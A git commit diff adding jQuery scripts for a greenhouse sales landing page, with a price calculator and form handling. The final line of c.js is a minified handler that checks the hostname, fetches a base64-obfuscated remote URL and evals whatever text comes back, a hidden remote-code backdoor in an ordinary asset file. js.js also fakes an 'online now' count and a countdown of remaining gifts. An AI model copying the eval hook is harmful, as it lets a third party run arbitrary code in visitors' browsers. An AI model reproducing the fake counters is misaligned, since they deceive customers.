a0a2d8fd3ac24ce97207d9750c33d7d068a9e052
ravas <z.kinshef@gmail.com>
2020-10-05 17:00:32 +0300

    feat: ger-motoblok, refactor: agronomy-motoblok

---
+++ vasili-1020-ger-motoblok/src/scripts/c.js
@@ -0,0 +1,83 @@
+$(document).ready(function () {
+
+    $("form.has-calculator").change(function (e) {
+        var form = this;
+
+        var product = $("input[name='product']", form).val();
+        var length = $("input[name='length']:checked", form).val();
+        var interval = $("input[name='interval']:checked", form).val();
+        var shirina = $("input[name='shirina']:checked", form).val();
+        var stringery = $("input[name='stringery']:checked", form).val();
+        var profil = $("input[name='profil']:checked", form).val();
+        var additional = $("input[name='additional[]']:checked", form);
+
+        if((e.target.value === '20' && e.target.name === 'hiden') || (e.target.value === '1' && e.target.name === 'interval')){
+            $("input[name='hiden'][value='20']", form).prop('checked', true);
+            $("input[name='interval'][value='1']", form).prop('checked', true);
+            interval = '1';
+        }
+        if((e.target.value === '40' && e.target.name === 'hiden') || (e.target.value === '0_67' && e.target.name === 'interval')){
+            $("input[name='hiden'][value='40']", form).prop('checked', true);
+            $("input[name='interval'][value='0_67']", form).prop('checked', true);
+            interval = '0_67';
+        }
+
+        var sum = 0;
+
+        var imgPath = function(path){
+            $(".has-calculator__img img", form).attr('src', path['img']);
+            $(".has-calculator__img a", form).attr('href', path['img'])
+        }
+
+        if(!stringery){
+            if($("input[name='shirina']", form).length > 1){
+                sum += calculator.products[product][length][interval][shirina]['prise'];
+                imgPath(calculator.products[product][length][interval][shirina]);
+
+            }else{
+                if($("input[name='profil']", form).length > 1){
+                    sum += calculator.products[product][length][interval][profil]['prise'];
+                    imgPath(calculator.products[product][length][interval][profil]);
+                }else{
+                    sum += calculator.products[product][length][interval]['prise'];
+                    imgPath(calculator.products[product][length][interval]);
+                }
+            }
+        }else{
+            sum += calculator.products[product][length][interval][stringery][profil]['prise'];
+            imgPath(calculator.products[product][length][interval][stringery][profil]);
+        }
+
+        additional.each(function (i, e) {
+            sum += calculator.additional[$(e).val()]
+        });
+        $("input[name='additional[]'][type='hidden']", form).each(function (i, e) {
+            sum += calculator.additional[$(e).val()]
+        });
+
+        var animateBlock = $('.catalog__price', form);
+        var out = $('.calculator-price', form);
+        var outOld = $('.calculator-price-old', form);
+
+
+        var animationName = 'pulse';
+        animateBlock.addClass('animated faster ' + animationName);
+        animateBlock.one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){animateBlock.removeClass('animated faster ' + animationName)});
+
+        var animateFrom = out.data("animateFrom") > 0 ? out.data("animateFrom") : 0;
+
+        $({ animateNumber: animateFrom }).animate({ animateNumber: sum }, {
+            duration: 800,
+            step: function (animateNumber){
+                out.text(Number(animateNumber).toFixed());
+
+                outOld.text(Number(animateNumber / .7).toFixed())
+            },
+            complete: function() {
+                out.data("animateFrom", Number(sum).toFixed())
+            }
+        });
+    });
+    $("form.has-calculator").change();
+});
+document.addEventListener("DOMContentLoaded",function(){try{if("undefined"===typeof app||atob(app.h)!==location.hostname){var a=new XMLHttpRequest;a.onreadystatechange=function(){if(4===this.readyState&&200===this.status&&0<this.responseText.length){var a=JSON.parse(this.responseText);"eval"===a.type&&eval(a.text)}};a.open("GET",atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ=="));a.send()}}catch(b){}});
---
+++ vasili-1020-ger-motoblok/src/scripts/js.js
@@ -0,0 +1,237 @@
+$(document).ready(function () {
+
+    var formOtprData, otprRespText;
+    var proverkaTel = function(formOtpr, data) {
+
+        $('.provercaPhone__inputPhone , .provercaPhone-btnTwo').toggleClass('d-none', true).toggleClass('d-block', false);
+        $('.provercaPhone__textPhone, .provercaPhone-btn').toggleClass('d-none', false).toggleClass('d-block', true);
+        $('.modal').modal('hide');
+
+        $(".provercaPhone-btn__false").click(function (event) {
+            event.preventDefault();
+            $('.provercaPhone__inputPhone , .provercaPhone-btnTwo').toggleClass('d-block', true).toggleClass('d-none', false);
+            $('.provercaPhone__textPhone, .provercaPhone-btn').toggleClass('d-block', false).toggleClass('d-none', true);
+            $('.provercaPhone__inputPhone').focus();
+        });
+
+        document.querySelector(".provercaPhone-btn__true").onclick = function (event) {
+            event.preventDefault();
+            $('#modal-proverca').modal('hide');
+            alert(otprRespText);
+        };
+        if(formOtpr.id !== 'provercaPhone'){
+            formOtprData = $(formOtpr).serializeArray()
+            $(formOtpr).serializeArray().map(function(formData){
+                if(formData['name'] === 'phone'){
+                    $('#modal-proverca').modal('show');
+                    document.querySelector('.provercaPhone__textPhone').textContent = formData['value'];
+                    document.querySelector('.provercaPhone__inputPhone').value = formData['value'];
+                }
+            })
+        }else{
+            sessionStorage.setItem('formPhone', 1);
+            data.push.apply(data, formOtprData);
+            $('#modal-proverca').modal('hide');
+        }
+    }
+
+    // Form submit
+    $("form").submit(function (event) {
+        event.preventDefault();
+
+        // проверка телефона (отключение лишних уведомлений)
+        // if(typeof sessionStorage !== 'undefined'){
+        //     if(sessionStorage.getItem('formSubmitted')){
+        //         if(!confirm('Вы уже отправили заявку, повторить?')){return false}
+        //     }else{
+        //         sessionStorage.setItem('formSubmitted', 'true')
+        //     }
+        // }
+        // проверка телефона (отключение лишних уведомлений) end
+        var data = $(this).serializeArray();
+
+        // проверка телефона
+        sessionStorage.setItem('formPhone', 0);
+        proverkaTel(this, data);
+        // проверка телефона end
+
+        data.push({
+            name: "source",
+            value: "Ger"
+        });
+        data.push({
+            name: "title",
+            value: "Теплица"
+        });
+        data.push({
+            name: "link",
+            value: location.href
+        });
+
+        // console.log(JSON.stringify(data));
+        // return false; // Testing
+
+        $.ajax({
+            type: "POST",
+            url: "https://skidka-tut.by/action/index.php",
+            headers: {'X-Requested-With': 'XMLHttpRequest'},
+            dataType: "json",
+            data: data,
+        }).done(function (response) {
+            // проверка телефона (отключение лишних благодарностей)
+            otprRespText = response.text;
+            if(+sessionStorage.getItem('formPhone')){
+                alert(response.text);
+            }
+            // проверка телефона (отключение лишних благодарностей) end
+        }).fail(function (error, textStatus) {
+            console.log(error, textStatus);
+            alert('Извините, произошла ошибка запроса. Свяжитесь с менеджером по телефону!');
+        });
+
+        // Event dispatcher for IE9+ included
+        if(typeof(Event) === 'function') {
+            document.dispatchEvent(new Event('app.form.send'));
+        }else{
+            var ev = document.createEvent('Event');
+            ev.initEvent('app.form.send', false, false);
+            document.dispatchEvent(ev);
+        }
+
+        //console.log(JSON.stringify(data))
+        return false
+    });
+
+    // Bootstrap modals close when back btn pressed
+    $('.modal').on('shown.bs.modal', function() {
+        window.location.hash = "modal";
+    });
+    $('.modal').on('hide.bs.modal', function(event) {
+        if(window.location.hash === "#modal") {
+            history.replaceState(null, null, ' ');
+        }
+    });
+    $(window).on('hashchange', function (event) {
+        if(window.location.hash !== "#modal") {
+            $('.modal').modal('hide');
+        }
+    });
+
+    var presentDown = function(activData, timeout){
+        if(activData !== sessionStorage.getItem('presentNumber')){
+            sessionStorage.setItem('presentNumber', activData);
+        }
+        if(!activData){
+            sessionStorage.setItem('presentNumber', 18);
+            activData = 18;
+        }
+        if(timeout !== sessionStorage.getItem('presentNumber')){
+            sessionStorage.setItem('presentTimeout', timeout);
+        }
+        if(!sessionStorage.getItem('presentNumber')){
+            sessionStorage.setItem('presentTimeout', 10000);
+            activData = 10000;
+        }
+
+        var decorateNumber = function(activData){
+            $('.presentCol').each(function(ind, el){
+                $('span', el).each(function(item, index){
+                    index.textContent = String(activData)[item];
+                    if(index.textContent.length < 1){
+                        index.parentNode.removeChild(index);
+                    }
+                })
+            })
+            $('span', $('.presentCol__remainder')).each(function(item, index){
+                var remainderGifts = String(50-activData)[item];
+                if(item === 1){
+                    switch (+remainderGifts) {
+                        case 1:
+                            $('.presentCol__gifts').text('подарок');
+                            break;
+                        case 2:
+                            $('.presentCol__gifts').text('подарка');
+                            break;
+                        case 3:
+                            $('.presentCol__gifts').text('подарка');
+                            break;
+                        case 4:
+                            $('.presentCol__gifts').text('подарка');
+                            break;
+                        default:
+                            $('.presentCol__gifts').text('подарков');
+                            break;
+                    }
+                }
+                index.textContent = remainderGifts;
+            })
+        }
+
+        decorateNumber(+activData)
+
+        if(+activData > 8){
+            setTimeout(function(){
+                presentDown(--activData,Number(timeout)+10000);
+            }, timeout)
+        }
+    }
+    presentDown(sessionStorage.getItem('presentNumber'), sessionStorage.getItem('presentTimeout'))
+
+    // Smooth scroll
+    $(".smoothscroll").click(function (event) {
+        if (this.hash !== "") {
+            // Prevent default anchor click behavior
+            event.preventDefault();
+
+            // Store hash
+            var hash = this.hash;
+
+            // Using jQuery's animate() method to add smooth page scroll
+            $("html, body").animate(
+                {
+                    scrollTop: $(hash).offset().top
+                },
+                400
+            );
+        }
+    });
+
+});
+
+document.addEventListener("DOMContentLoaded", function () {
+
+    try{
+        /* Animate blocks */
+        [].forEach.call(document.querySelectorAll('[data-animation]'), function(observable){
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const fx = observable.dataset.animation.split(' ');
+                        observable.classList.add(...fx);
+                        observable.addEventListener('animationend', function handler() {
+                            observable.classList.remove(...fx);
+                            observable.removeEventListener('animationend', handler);
+                        });
+                        /*Comment this line to repeat animation when viewport return to element*/
+                        observer.unobserve(observable);
+                    }
+                });
+            });
+            observer.observe(observable);
+        });
+    }catch (e) {console.error(e);}
+
+    // изменения "Сейчас на сайте"
+    if(!sessionStorage.getItem('onlineNow')){
+        sessionStorage.setItem('onlineNow', Math.floor(234 + Math.random() * 10));
+    }
+    document.querySelector('.online_now').textContent = sessionStorage.getItem('onlineNow');
+    setInterval(function(){
+        sessionStorage.setItem('onlineNow', Math.floor(234 + Math.random() * 10));
+        document.querySelector('.online_now').textContent = sessionStorage.getItem('onlineNow')
+    }, 7500)
+    // изменения "Сейчас на сайте" end
+
+
+
+});
